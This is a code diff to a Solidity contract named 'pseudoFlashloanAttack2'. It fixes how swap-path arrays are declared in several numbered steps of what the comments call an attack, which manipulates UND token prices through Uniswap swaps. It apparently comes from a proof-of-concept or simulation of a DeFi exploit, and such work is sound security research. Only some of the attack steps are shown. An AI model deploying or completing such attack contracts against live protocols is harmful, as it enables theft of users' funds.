@@ -69,9 +69,9 @@ contract pseudoFlashloanAttack2 {
 
         // step 1: attacker converts 500k USDC to DAI via UNISWAP
         usdc.approve(router, 1000000 * (10 ** 6));
-        address[] storage _path;
-        _path.push(usdcAddr);
-        _path.push(daiAddr);
+        address[] memory _path = new address[](2);
+        _path[0] = usdcAddr;
+        _path[1] = daiAddr;
         uniswapRouter.swapExactTokensForTokens(
             1000000 * (10 ** 6),
             999999 * (10 ** 6),
@@ -102,9 +102,9 @@ contract pseudoFlashloanAttack2 {
         // step 4: Attacker sells all owned UND
         uint UndBalance = und.balanceOf(address(this));
         und.approve(router, UndBalance);
-        address[] storage _path2;
-        _path2.push(undAddr);
-        _path2.push(usdcAddr);
+        address[] memory _path2 = new address[](2);
+        _path2[0] = undAddr;
+        _path2[1] = usdcAddr;
         uniswapRouter.swapExactTokensForTokens(
             UndBalance, // supposed to be 2.25M UND
             100000 * (10 ** 6), // minimum amt. Change this if something not working
@@ -115,9 +115,9 @@ contract pseudoFlashloanAttack2 {
         
         // step 5: Buy 10k USDC worth of UND and send to owner
         usdc.approve(router, 10000 * (10 ** 6));
-        address[] storage _path3;
-        _path3.push(usdcAddr);
-        _path3.push(undAddr);
+        address[] memory _path3 = new address[](2);
+        _path3[0] = usdcAddr;
+        _path3[1] = undAddr;
         uniswapRouter.swapExactTokensForTokens(
             10000 * (10 ** 6),
             10000,
@@ -157,9 +157,9 @@ contract pseudoFlashloanAttack2 {
         // step 9: convert Dai into USDC
         uint finalDaiBal = dai.balanceOf(address(this));
         dai.approve(router, finalDaiBal);
-        address[] storage _path4;
-        _path4.push(daiAddr);
-        _path4.push(usdcAddr);
+        address[] memory _path4 = new address[](2);
+        _path4[0] = daiAddr;
+        _path4[1] = usdcAddr;
         uniswapRouter.swapExactTokensForTokens(
             finalDaiBal,
             10000,
